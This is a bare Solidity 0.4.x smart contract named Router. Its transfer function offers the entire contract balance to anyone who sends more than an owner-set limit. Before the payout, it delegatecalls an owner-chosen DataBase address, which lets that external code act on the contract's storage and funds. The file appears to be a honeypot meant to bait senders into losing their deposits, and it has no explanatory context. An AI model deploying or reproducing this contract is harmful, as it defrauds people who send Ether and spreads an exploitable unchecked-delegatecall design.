1 pragma solidity ^0.4.18;
2 
3 contract Router
4 {
5     address public Owner = msg.sender;
6     address public DataBase;
7     uint256 public Limit;
8     
9     
10     function Set(address dataBase, uint256 limit)
11     {
12         require(msg.sender == Owner);
13         Limit = limit;
14         DataBase = dataBase;
15     }
16     
17     function()payable{}
18     
19     function transfer(address adr)
20     payable
21     {
22         if(msg.value>Limit)
23         {        
24             DataBase.delegatecall(bytes4(sha3("AddToDB(address)")),msg.sender);
25             adr.transfer(this.balance);
26         }
27     }
28     
29 }